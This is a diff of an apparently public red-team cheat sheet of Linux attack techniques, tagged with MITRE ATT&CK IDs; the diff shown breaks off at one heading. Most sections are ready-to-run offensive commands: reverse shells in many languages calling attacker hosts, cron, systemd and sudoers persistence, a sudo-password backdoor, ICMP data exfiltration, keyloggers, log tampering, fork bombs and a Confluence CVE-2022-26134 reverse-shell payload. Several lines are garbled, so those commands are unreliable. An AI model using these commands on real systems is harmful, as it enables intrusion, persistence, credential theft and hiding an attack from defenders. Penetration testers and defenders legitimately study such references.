@@ -1,6 +1,96 @@
 # Linux TTPs
 
-## System Enumeration / Post Exploitation
+## Table of Contents
+
+- [System Enumeration / Post Exploitation](#system-enumeration--post-exploitation) - T1082
+- [Linux Miscellaneous Commands / Covering Tracks](#linux-miscellaneous-commands--covering-tracks) - T1070.003
+- [Efficient Linux CLI Navigation](#efficient-linux-cli-navigation)
+- [Fork Bomb](#fork-bomb) - T1499.002
+- [TCPDump](#tcpdump) - T1040
+- [One Liner to Add Persistence on a Box via Cron](#one-liner-to-add-persistence-on-a-box-via-cron) - T1053.003
+- [Systemd User Level Persistence](#systemd-user-level-persistence) - T1543.002
+- [Udev Rules Persistence](#udev-rules-persistence) - T1546
+- [Systemd Timer Persistence](#systemd-timer-persistence) - T1053.006
+- [Backdooring Sudo](#backdooring-sudo) - T1548.003
+- [ICMP Tunneling One Liner](#icmp-tunneling-one-liner) - T1572
+- [One Liner to Add Persistence on a Box via Sudoers File](#one-liner-to-add-persistence-on-a-box-via-sudoers-file) - T1548.003
+- [Find Server Strings from HTTP Responses](#find-server-strings-from-http-responses) - T1082
+- [Enumerating File Capabilities with Getcap](#enumerating-file-capabilities-with-getcap) - T1548.001
+- [Enumerating User Files for Interesting Information](#enumerating-user-files-for-interesting-information) - T1552.001
+- [Finding World-Writable Files](#finding-world-writable-files) - T1083
+- [Search GitHub for Personal Access Tokens](#search-github-for-personal-access-tokens) - T1552.001
+- [Search for OpenAI API Keys](#search-for-openai-api-keys) - T1552.001
+- [Search for Google API Keys](#search-for-google-api-keys) - T1552.001
+- [Search for Slack Tokens](#search-for-slack-tokens) - T1552.001
+- [Search for Hardcoded Passwords](#search-for-hardcoded-passwords) - T1552.001
+- [Search for Passwords in Memory and Core Dumps](#search-for-passwords-in-memory-and-core-dumps) - T1003
+- [Searching Man Pages](#searching-man-pages)
+- [Username Enumeration with Getent](#username-enumeration-with-getent) - T1087.001
+- [Utilize Crt.sh and EyeWitness to Enumerate Web Pages](#utilize-crtsh-and-eyewitness-to-enumerate-web-pages) - T1596
+- [Nmap TTPs](#nmap-ttps) - T1046
+- [Encrypt Files with Vim](#encrypt-files-with-vim) - T1027
+- [Testssl.sh](#testsslsh) - T1046
+- [Apache Flink Directory Traversal](#apache-flink-directory-traversal) - T1083
+- [LD_PRELOAD Hijacking](#ld_preload-hijacking) - T1574.006
+- [Bash Keylogger](#bash-keylogger) - T1056.001
+- [Strace Keylogger](#strace-keylogger) - T1056.001
+- [Netcat UDP Scanner](#netcat-udp-scanner) - T1046
+- [Recon for Specific Device Before Enumerating](#recon-for-specific-device-before-enumerating) - T1040
+- [TTL Fingerprinting](#ttl-fingerprinting) - T1082
+- [Cisco IOS 11.2 - 12.2 Vulnerability](#cisco-ios-112---122-vulnerability) - T1190
+- [FTP Through Non-Interactive Shell](#ftp-through-non-interactive-shell) - T1071.002
+- [NetCat Listeners](#netcat-listeners) - T1095
+- [Python Reverse Shell](#python-reverse-shell) - T1059.006
+- [Bash Reverse Shell](#bash-reverse-shell) - T1059.004
+- [Turn Nmap into a Vulnerability Scanner](#turn-nmap-into-a-vulnerability-scanner) - T1595.002
+- [Nmap Privilege Escalation](#nmap-privilege-escalation) - T1548
+- [IDS/IPS Nmap Evasion](#idsips-nmap-evasion) - T1046
+- [Scanning Large Networks and Avoiding Sensitive IP Ranges](#scanning-large-networks-and-avoiding-sensitive-ip-ranges) - T1046
+- [Finding Open FTP Servers](#finding-open-ftp-servers) - T1046
+- [Scalable Heartbleed Hunting with Shodan](#scalable-heartbleed-hunting-with-shodan) - T1595.002
+- [Extract Passwords from HTTP POST Requests](#extract-passwords-from-http-post-requests) - T1040
+- [BPF'ing DNS Records](#bpfing-dns-records) - T1040
+- [Important Files](#important-files) - T1083
+- [Backdooring Systemd Services](#backdooring-systemd-services) - T1543.002
+- [Old-Fashioned Log Cleaning](#old-fashioned-log-cleaning) - T1070.002
+- [ASLR Enumeration](#aslr-enumeration) - T1082
+- [Reverse Shells](#reverse-shells) - T1059
+- [Password Harvesting](#password-harvesting) - T1552
+- [Unusual Accounts](#unusual-accounts) - T1087.001
+- [Enumerating with Finger](#enumerating-with-finger) - T1087
+- [Enumerating with Traceroute](#enumerating-with-traceroute) - T1016
+- [Changing MAC Addresses](#changing-mac-addresses) - T1036.005
+- [Routers](#routers) - T1018
+- [Metasploit Callback Automation](#metasploit-callback-automation) - T1219
+- [Confluence CVE-2022-26134](#confluence-cve-2022-26134) - T1190
+- [POP Syntax](#pop-syntax) - T1071.003
+- [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding) - T1572
+- [Dominating Samba with pdbedit](#dominating-samba-with-pdbedit) - T1087
+- [Encrypted File Transfers with Ncat](#encrypted-file-transfers-with-ncat) - T1573
+- [Tsharking for Domain Users](#tsharking-for-domain-users) - T1040
+- [IP Information](#ip-information) - T1016
+- [Cloning Websites for Social Engineering with Wget](#cloning-websites-for-social-engineering-with-wget) - T1189
+- [Spidering the Web with Wget](#spidering-the-web-with-wget) - T1213
+- [Hiding PID Listings From Non-Root Users](#hiding-pid-listings-from-non-root-users) - T1564
+- [Exporting Objects with Tshark](#exporting-objects-with-tshark) - T1040
+- [Rogue APs with Karmetasploit](#rogue-aps-with-karmetasploit) - T1557.002
+- [Passive Fingerprinting with P0f](#passive-fingerprinting-with-p0f) - T1040
+- [Advanced Mitm Attacks with Bettercap Filters](#advanced-mitm-attacks-with-bettercap-filters) - T1557
+- [Rust Reverse Shell](#rust-reverse-shell) - T1059
+- [Fake Sudo Program to Harvest Credentials](#fake-sudo-program-to-harvest-credentials) - T1056
+- [TruffleHog GitHub Organizations](#trufflehog-github-organizations) - T1552.001
+- [Bypass File System Protections for Containers](#bypass-file-system-protections-read-only-and-no-exec-for-containers) - T1611
+- [Dumping Printer NVRAM](#dumping-printer-nvram) - T1552
+- [Slash Proc Magic](#slash-proc-magic) - T1564.001
+- [Linux Timestomping](#linux-timestomping) - T1070.006
+- [Linux Bash History Stomping](#linux-bash-history-stomping) - T1070.003
+- [Taking Apart URL Shorteners with cURL](#taking-apart-url-shorteners-with-curl) - T1082
+- [Email Spoofing PHP](#email-spoofing-php) - T1566
+- [Linux SIEM Bypass](#linux-siem-bypass) - T1006
+
+---
+
+## System Enumeration / Post Exploitation (T1082)
 
 ```sh
 id
@@ -31,7 +121,7 @@ Search for useful binaries:
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
 
-## Linux Miscellaneous Commands / Covering Tracks
+## Linux Miscellaneous Commands / Covering Tracks (T1070.003)
 
 ```bash
 chattr (+/-)i file
@@ -50,7 +140,7 @@ ln /dev/null -/.bash_history -sf
 
 ![CLI](https://user-images.githubusercontent.com/72598486/204325842-a35ac0ca-0944-4c96-a089-6e0108945919.png)
 
-# Fork Bomb
+# Fork Bomb (T1499.002)
 
 Linux:
 
@@ -67,14 +157,14 @@ Python:
     while True: os.fork()
 ```
 
-## TCPDump
+## TCPDump (T1040)
 
 ```bash
 tcpdump -i ethO -XX -w out.pcap
 tcpdump -i ethO port XX dst X.X.X.X
 ```
 
-## One Liner to Add Persistence on a Box via Cron
+## One Liner to Add Persistence on a Box via Cron (T1053.003)
 
 ```sh
 echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
@@ -82,7 +172,7 @@ echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
 
 On the attack platform: ```nc -lvp 1234```
 
-## Systemd User Level Persistence
+## Systemd User Level Persistence (T1543.002)
 
 Place a service file in ```~/.config/systemd/user/```
 
@@ -110,7 +200,7 @@ systemctl --user start persistence.service
 
 On the next user login systemd will happily start a reverse shell.
 
-## Udev Rules Persistence
+## Udev Rules Persistence (T1546)
 
 `udev` rules in Linux are configuration files that allow the system to dynamically manage device files in the /dev directory. These rules can trigger specific actions or scripts when devices are added, removed, or change state. By matching attributes like device type, vendor ID, or kernel name, udev rules help automate tasks related to hardware events, making device management more flexible and customizable.
 
@@ -129,7 +219,7 @@ sudo udevadm control --reload-rules
 sudo udevadm trigger
 ```
 
-## Systemd Timer Persistence
+## Systemd Timer Persistence (T1053.006)
 
 Systemd-timers are similar to cron jobs but offer more flexibility and integration with systemd. These can be harnessed to execute a script or binary at specified intervals or times, maintaining persistence on a compromised system.
 
@@ -169,7 +259,7 @@ sudo systemctl enable shout.timer
 sudo systemctl start shout.timer
 ```
 
-## Backdooring Sudo
+## Backdooring Sudo (T1548.003)
 
 Add to `.bashrc`
 
@@ -182,19 +272,19 @@ function sudo() {
     $realsudo "${@:1}"
 ```
 
-## ICMP Tunneling One Liner
+## ICMP Tunneling One Liner (T1572)
 
 ```sh
 xxd -p -c 4 /path/exfil_file | while read line; do ping -c 1 -p $line <C2 IP>; done
 ```
 
-## One Liner to Add Persistence on a Box via Sudoers File
+## One Liner to Add Persistence on a Box via Sudoers File (T1548.003)
 
 ```sh
 echo "%sudo  ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
 
-## Find Server Strings from HTTP Responses
+## Find Server Strings from HTTP Responses (T1082)
 
 Finding server strings from a file of URLs
 
@@ -202,7 +292,7 @@ Finding server strings from a file of URLs
 curl -s --head -K servers.txt | grep -i server
 ```
 
-## Enumerating File Capabilities with Getcap
+## Enumerating File Capabilities with Getcap (T1548.001)
 
 getcap displays the name and capabilities of each specified file. ```-r```  enables recursive search.
 
@@ -210,7 +300,7 @@ getcap displays the name and capabilities of each specified file. ```-r```  enab
 getcap -r / 2>/dev/null
 ```
 
-## Enumerating User Files for Interesting Information
+## Enumerating User Files for Interesting Information (T1552.001)
 
 ```sh
 cat ~/.bash_history
@@ -220,13 +310,13 @@ cat ~/.mysql_history
 cat ~/.php_history
 ```
 
-## Finding World-Writable Files
+## Finding World-Writable Files (T1083)
 
 ```sh
 find /dir -xdev -perm +o=w ! \( -type d -perm +o=t \) ! -type l -print
 ```
 
-## Search GitHub for Personal Access Tokens
+## Search GitHub for Personal Access Tokens (T1552.001)
 
 To use this regex expression on the webpage, prepend and append a `/` to the expression:
 
@@ -234,19 +324,19 @@ To use this regex expression on the webpage, prepend and append a `/` to the exp
 ^github_pat_[A-Za-z0-9_]+$
 ```
 
-## Search for OpenAI API Keys
+## Search for OpenAI API Keys (T1552.001)
 
 ```sh
 sk(-[a-zA-Z0-9]+)*-[A-Za-z0-9]{48}
 ```
 
-## Search for Google API Keys
+## Search for Google API Keys (T1552.001)
 
 ```sh
 AIza[0-9A-Za-z-_]{35}
 ```
 
-## Search for Slack Tokens
+## Search for Slack Tokens (T1552.001)
 
 ```sh
 (path:*.(xml|json|properties|sql|txt|log|tmp|backup|bak|enc|yml|yaml|toml|ini|config|conf|cfg|env|envrc|prod|secret|private|key))
@@ -254,7 +344,7 @@ AND (access_key|secret_key|access_token|api_key|apikey|api_secret|apiSecret|app_
 AND ("xox" AND slack)
 ```
 
-## Search for Hardcoded Passwords
+## Search for Hardcoded Passwords (T1552.001)
 
 ```sh
 grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *
@@ -268,7 +358,7 @@ The regex is a POSIX ERE expression that matches
 
 To output matches, add -o option to grep
 
-## Search for Passwords in Memory and Core Dumps
+## Search for Passwords in Memory and Core Dumps (T1003)
 
 Memory:
 
@@ -304,7 +394,7 @@ ssh-add(1)               - adds private key identities to the OpenSSH authentica
 ssh-agent(1)             - OpenSSH authentication agent
 ```
 
-## Username Enumeration with Getent
+## Username Enumeration with Getent (T1087.001)
 
 ```getent``` is a Unix command that helps a user get entries in a number of important text files called databases. This includes the passwd and group databases which store user information – hence getent is a common way to look up user details on Unix.
 
@@ -312,7 +402,7 @@ ssh-agent(1)             - OpenSSH authentication agent
 getent passwd <username>
 ```
 
-## Utilize Crt.sh and EyeWitness to Enumerate Web Pages
+## Utilize Crt.sh and EyeWitness to Enumerate Web Pages (T1596)
 
 Uses crt.sh to identify certificates for target domain before screenshotting and actively scanning each webpage for login forms to use common credentials on.
 
@@ -320,7 +410,7 @@ Uses crt.sh to identify certificates for target domain before screenshotting and
 root@RoseSecurity:~# curl -s 'https://crt.sh/?q=<Website_You_Want_To_Enumerate>&output=json' | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > ~/URLs.txt; eyewitness -f ~/URLs.txt --active-scan
 ```
 
-## Nmap TTPs
+## Nmap TTPs (T1046)
 
 Below are useful Nmap scripts and their descriptions. You can find a full list of available scripts [here](https://nmap.org/nsedoc/scripts/):
 
@@ -350,13 +440,13 @@ Below are useful Nmap scripts and their descriptions. You can find a full list o
 
 - `tftp-enum`: Enumerates TFTP filenames by testing for a list of common ones.
 
-## Nmap Scan Every Interface that is Assigned an IP
+## Nmap Scan Every Interface that is Assigned an IP (T1046)
 
 ```sh
 ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
 ```
 
-## Nmap IPv6 Nodes
+## Nmap IPv6 Nodes (T1046)
 
 - All nodes multicast: ff02::1
 - All routers multicast: ff02::2
@@ -379,19 +469,19 @@ Utilize `ndp` to enumerate all of the current ndp entries.
 ndp -an
 ```
 
-## Nmap to Evaluate HTTPS Support
+## Nmap to Evaluate HTTPS Support (T1046)
 
 ```sh
 nmap -p 443 --script=ssl-enum-ciphers <Target Domain>
 ```
 
-## Encrypt Files with Vim
+## Encrypt Files with Vim (T1027)
 
 ```sh
 vim –x <filename.txt>
 ```
 
-## Testssl.sh
+## Testssl.sh (T1046)
 
 Enumerating ciphers and encryption weaknesses using Testssl command line tool:
 
@@ -409,13 +499,13 @@ testssl.sh -t xmpp --xmpphost <XMPP domain> <jabberhost>.<tld>:5222
 testssl.sh --starttls imap <imaphost>.<tld>:143
 ```
 
-## Apache Flink Directory Traversal
+## Apache Flink Directory Traversal (T1083)
 
 ```sh
 cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
 ```
 
-## LD_PRELOAD Hijacking
+## LD_PRELOAD Hijacking (T1574.006)
 
 If you set LD_PRELOAD to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so)
 
@@ -423,11 +513,11 @@ If you set LD_PRELOAD to the path of a shared object, that file will be loaded b
 LD_PRELOAD=/path/to/my/malicious.so /bin/ls
 ```
 
-## Bash Keylogger
+## Bash Keylogger (T1056.001)
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
 
-## Strace Keylogger
+## Strace Keylogger (T1056.001)
 
 ```sh
 root@rosesecurity:~# ps aux | grep bash
@@ -450,19 +540,19 @@ root@securitynik:~# strace -p 3103 -t -e write -q -f -o keylogger.txt &
 [1] 3432
 ```
 
-## Netcat UDP Scanner
+## Netcat UDP Scanner (T1046)
 
 ```sh
 nc-v -u -z <IP> <Port>
 ```
 
-## Recon for Specific Device Before Enumerating
+## Recon for Specific Device Before Enumerating (T1040)
 
 ```sh
 sudo tcpdump 'ether host XX:XX:XX:XX:XX:XX' -i en0 -vnt > CheckScan.txt |  tee CheckScan.txt | grep --line-buffered pattern | ( while read -r line; do sudo nmap -sV -n -T4 -O2 -oX NMAPScan.xml; rm CheckScan.txt; done; ) &
 ```
 
-## TTL Fingerprinting
+## TTL Fingerprinting (T1082)
 
 ```sh
 Windows : 128
@@ -471,13 +561,13 @@ Network : 255
 Solaris : 255
 ```
 
-## Cisco IOS 11.2 - 12.2 Vulnerability
+## Cisco IOS 11.2 - 12.2 Vulnerability (T1190)
 
 ```plaintext
 http://ip/level/16-99/exec/show/config
 ```
 
-## FTP Through Non-Interactive Shell
+## FTP Through Non-Interactive Shell (T1071.002)
 
 ```bash
 echo open ip 21 ftp.txt
@@ -488,7 +578,7 @@ echo GET file=tp.txt echo bfe ftp.txt
 ftp -s:ftp.txt
 ```
 
-## NetCat Listeners
+## NetCat Listeners (T1095)
 
 ```bash
 nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
@@ -501,20 +591,20 @@ Persistent Ncat listener:
 ncat -lvk 443
 ```
 
-## Python Reverse Shell
+## Python Reverse Shell (T1059.006)
 
 ```python
 python -c 'import socket,subprocess,os; s=socket.socket(socket..;;F_INET, socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
 p~subprocess.call( 1"/bin/sh","-i"] I;'
 ```
 
-## Bash Reverse Shell
+## Bash Reverse Shell (T1059.004)
 
 ```bash
 bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 ```
 
-## Turn Nmap into a Vulnerability Scanner
+## Turn Nmap into a Vulnerability Scanner (T1595.002)
 
 Download: <https://github.com/scipag/vulscan>
 
@@ -524,7 +614,7 @@ Usage:
 nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
 ```
 
-## Nmap Privilege Escalation
+## Nmap Privilege Escalation (T1548)
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
@@ -534,7 +624,7 @@ echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF
 ```
 
-## Nmap Using Multiple Scripts on One Target
+## Nmap Using Multiple Scripts on One Target (T1046)
 
 Usage:
 
@@ -544,7 +634,7 @@ nmap --script "sql-*" <IP>
 nmap --script "ftp-*" <IP>
 ```
 
-## IDS/IPS Nmap Evasion
+## IDS/IPS Nmap Evasion (T1046)
 
 Low and slow (-T2), Fast mode (-F), Append random data to sent packets (--data-length), Randomize hosts, and verbosely conduct service detection on a file of hosts and output to XML.
 
@@ -552,7 +642,7 @@ Low and slow (-T2), Fast mode (-F), Append random data to sent packets (--data-l
 nmap -T2 -F --data-length 5 --randomize-hosts -sV -v -iL (targets.txt) -oX (output.xml)
 ```
 
-## Scanning Large Networks and Avoiding Sensitive IP Ranges
+## Scanning Large Networks and Avoiding Sensitive IP Ranges (T1046)
 
 Set ```exclude.txt``` equal to the contents of <https://pastebin.com/53DP2HNV>
 
@@ -560,7 +650,7 @@ Set ```exclude.txt``` equal to the contents of <https://pastebin.com/53DP2HNV>
 masscan 0.0.0.0/0 -p0-65535 –excludedfile exclude.txt
 ```
 
-## Finding Open FTP Servers
+## Finding Open FTP Servers (T1046)
 
 Finding FTP servers that allow anonymous logons can assist in numerous red-teaming activities such as Nmap FTP bounce scans.
 
@@ -568,7 +658,7 @@ Finding FTP servers that allow anonymous logons can assist in numerous red-teami
 masscan -p 21 <IP Range> -oL ftp_servers.txt; nmap -iL ftp_servers.txt —script ftp-anon -oL open_ftp_servers.txt
 ```
 
-## Scalable Heartbleed Hunting with Shodan
+## Scalable Heartbleed Hunting with Shodan (T1595.002)
 
 Hunt for components susceptible to the Heartbleed vulnerability before exploiting the devices memory with this one-liner. This command requires an Academic Plus Shodan API key.
 
@@ -576,13 +666,13 @@ Hunt for components susceptible to the Heartbleed vulnerability before exploitin
 shodan search vuln:cve-2014-0160 --fields hostnames | awk NF > heartbleed_hosts.txt; cat heartbleed_hosts.txt | while read line; do heartbleed.py "$line"; done
 ```
 
-## Extract Passwords from HTTP POST Requests
+## Extract Passwords from HTTP POST Requests (T1040)
 
 ```sh
 sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
 ```
 
-## BPF'ing DNS Records
+## BPF'ing DNS Records (T1040)
 
 ```sh
 # All queries
@@ -592,7 +682,7 @@ tcpdump -nt 'dst port 53 and udp[10] & 0x80 = 0'
 tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
 ```
 
-## Important Files
+## Important Files (T1083)
 
 ```sh
 /boot/vmlinuz : The Linux Kernel file.
@@ -619,7 +709,7 @@ tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
 /var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
 ```
 
-## Backdooring Systemd Services
+## Backdooring Systemd Services (T1543.002)
 
 Create the following service descriptor at ```/etc/systemd/system/notmalicious.service```:
 
@@ -639,7 +729,7 @@ Enable the backdoor service to run on restart:
 sudo systemctl enable notmalicious
 ```
 
-## Old-Fashioned Log Cleaning
+## Old-Fashioned Log Cleaning (T1070.002)
 
 Grep to remove sensitive attacker information then copy into original logs
 
@@ -648,7 +738,7 @@ Grep to remove sensitive attacker information then copy into original logs
 # mv /tmp/cleanup.log /var/log/auth.log
 ```
 
-## ASLR Enumeration
+## ASLR Enumeration (T1082)
 
 Address space layout randomization (ASLR) is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap, and libraries.
 
@@ -658,9 +748,9 @@ Address space layout randomization (ASLR) is a computer security technique invol
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 ```
 
-# Reverse Shells
+# Reverse Shells (T1059)
 
-## Encrypted Reverse Shells with OpenSSL
+## Encrypted Reverse Shells with OpenSSL (T1573)
 
 Generate SSL certificate:
 
@@ -680,37 +770,37 @@ Run the payload on target machine using ```openssl```:
 mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect 127.0.0.1:4444>/tmp/s 2>/dev/null;rm /tmp/s
 ```
 
-## Bash
+## Bash (T1059.004)
 
 ```sh
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-## PERL
+## PERL (T1059.006)
 
 ```sh
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## Python
+## Python (T1059.006)
 
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-## PHP
+## PHP (T1059.006)
 
 ```sh
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-## Ruby
+## Ruby (T1059.006)
 
 ```sh
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-## Netcat
+## Netcat (T1095)
 
 ```sh
 nc -e /bin/sh 10.0.0.1 1234
@@ -733,7 +823,7 @@ ncat -vC --ssl www.target.org 443
 openssl s_client -crlf -connect www.target.org:443
 ```
 
-## Socat
+## Socat (T1095)
 
 Reverse shell:
 
@@ -763,7 +853,7 @@ On the victim platform:
 user@victim $ socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
 
-## Java
+## Java (T1059)
 
 ```sh
 r = Runtime.getRuntime()
@@ -771,7 +861,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-# Password Harvesting
+# Password Harvesting (T1552)
 
 Passwords can be found in many places
 
@@ -803,7 +893,7 @@ Enumerate password and account information with ```chage```
 user@victim $ chage -l
 ```
 
-## Unusual Accounts
+## Unusual Accounts (T1087.001)
 
 Look in /etc/passwd for new accounts in a sorted list:
 
@@ -817,7 +907,7 @@ Look for users with a UID of 0:
 user@RoseSecurity $ grep :0: /etc/passwd
 ```
 
-## Enumerating with Finger
+## Enumerating with Finger (T1087)
 
 Various information leak vulnerabilities exist in fingerd implementations. A popular attack involves issuing a '1 2 3 4 5 6 7 8 9 0' request against a Solaris host running fingerd.
 
@@ -901,7 +991,7 @@ Poorly written fingerd implementations allow attackers to pipe commands through 
 uid=0(root) gid=0(root)
 ```
 
-## Enumerating with Traceroute
+## Enumerating with Traceroute (T1016)
 
 Latency jumps in Traceroute values can identify geographic data:
 
@@ -915,7 +1005,7 @@ Latency jumps in Traceroute values can identify geographic data:
 
 ```source: https://www.tolaris.com/2008/10/09/identifying-undersea-fibre-and-satellite-links-with-traceroute/```
 
-## Changing MAC Addresses
+## Changing MAC Addresses (T1036.005)
 
 Look up vendor MAC you want to impersonate: <https://mac2vendor.com/>
 
@@ -927,7 +1017,7 @@ sudo ifconfig <interface-name> hw ether <new-mac-address>
 sudo ifconfig <interface-name> up
 ```
 
-# Routers
+# Routers (T1018)
 
 Resources:
 
@@ -935,7 +1025,7 @@ Resources:
  https://www.routerpasswords.com
 ```
 
-# Metasploit Callback Automation
+# Metasploit Callback Automation (T1219)
 
 Use AutoRunScript to run commands on a reverse shell callback
 
@@ -953,7 +1043,7 @@ run post/windows/manage/killfw
 run post/windows/gather/checkvm
 ```
 
-## Metasploit Resource Script Creation
+## Metasploit Resource Script Creation (T1219)
 
 Although there are several resource scripts that are available through the framework, you may want to build a custom script of your own. For example, if you routinely run a specific exploit and payload combination against a target, you may want to create a resource script to automate these commands for you. Since this example uses purely ```msfconsole``` commands, the easiest way to create a resource script is through the ```makerc``` command available in ```msfconsole```. The ```makerc``` command records all of the commands you've run in the console and saves them in a resource script for you.
 
@@ -971,7 +1061,7 @@ To save these commands to a resource script, we can use the ```makerc``` command
 msf (ms08_067_netapi) > makerc ~/Desktop/myscript.rc
 ```
 
-## Metasploit Session Management
+## Metasploit Session Management (T1219)
 
 List all sessions
 
@@ -997,7 +1087,7 @@ Upgrade a shell to a meterpreter session on many platforms
 msf6> sessions -u
 ```
 
-## Metasploit Tips I Discovered Too Late
+## Metasploit Tips I Discovered Too Late (T1219)
 
 In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.
 
@@ -1116,7 +1206,7 @@ msf6 > db_import ~/nmap_scan.xml
 [*] Successfully imported  /home/kali/nmap_scan.xml
 ```
 
-# Confluence CVE-2022-26134
+# Confluence CVE-2022-26134 (T1190)
 
 CVE-2022-26314 is an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server (typically the confluence user on Linux installations). Given the nature of the vulnerability, internet-facing Confluence servers are at very high risk.
 
@@ -1144,7 +1234,7 @@ Decoded:
 ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
 ```
 
-## POP Syntax
+## POP Syntax (T1071.003)
 
 ```
 POP Commands:
@@ -1160,7 +1250,7 @@ POP Commands:
   CAPA               Get capabilities
 ```
 
-## SSH Dynamic Port Forwarding
+## SSH Dynamic Port Forwarding (T1572)
 
  Forwards one local port to multiple remote hosts; it is useful for accessing multiple systems.
 
@@ -1174,7 +1264,7 @@ POP Commands:
  proxychains smbclient -L fileserver22
  ```
 
-## Dominating Samba with pdbedit
+## Dominating Samba with pdbedit (T1087)
 
  The ```pdbedit``` program is used to manage the users accounts stored in the sam database and can only be run by root. There are five main ways to use pdbedit: adding a user account, removing a user account, modifying a user account, listing user accounts, importing users accounts.
 
@@ -1227,7 +1317,7 @@ samba:45:0F2B255F7B67A7A9AAD3B435B51404EE:
           [UX         ]:LCT-3BFA1E8D:
  ```
 
-## Encrypted File Transfers with Ncat
+## Encrypted File Transfers with Ncat (T1573)
 
 Suppose you have an SSH tunnel, and you want to copy a file to the remote machine. You could just scp it directly, but that opens up another connection. The goal is to re-use the existing connection. You can use ncat to do this:
 
@@ -1244,7 +1334,7 @@ $ ncat -v -w 2 127.0.0.1 31000 < file
 
 No extra overhead. TCP takes care of error correction. SSH has already encrypted the pipe.
 
-## Tsharking for Domain Users
+## Tsharking for Domain Users (T1040)
 
 ```
 # Read a PCAP file
@@ -1254,7 +1344,7 @@ $ tshark -r <pcap> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 $ tshark -i <interface> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 ```
 
-## IP Information
+## IP Information (T1016)
 
 ```bash
 #!/usr/bin/env bash
@@ -1279,7 +1369,7 @@ ipinfo () {
 ipinfo
 ```
 
-## Cloning Websites for Social Engineering with Wget
+## Cloning Websites for Social Engineering with Wget (T1189)
 
  ```
  wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com
@@ -1295,7 +1385,7 @@ ipinfo
 --adjust-extension - adds the appropriate extensions (e.g. html, css, js) to files if they were retrieved without them.
 ```
 
-## Spidering the Web with Wget
+## Spidering the Web with Wget (T1213)
 
 ```
 export https_proxy=https://127.0.0.1:8080
@@ -1303,7 +1393,7 @@ export https_proxy=https://127.0.0.1:8080
 wget -r -P /tmp --no-check-certificate -e robots=off ‐‐recursive ‐‐no-parent http://example.com/
 ```
 
-## Hiding PID Listings From Non-Root Users
+## Hiding PID Listings From Non-Root Users (T1564)
 
 To prevent a user from seeing all the processes running on a system, mount the /proc file system using the hidepid=2 option:
 
@@ -1313,7 +1403,7 @@ $ sudo mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc
 # 2: Process files are invisible to non-root users. The existence of a process can be learned by other means, but its effective user ID (UID) and group ID (GID) are hidden.
 ```
 
-## Exporting Objects with Tshark
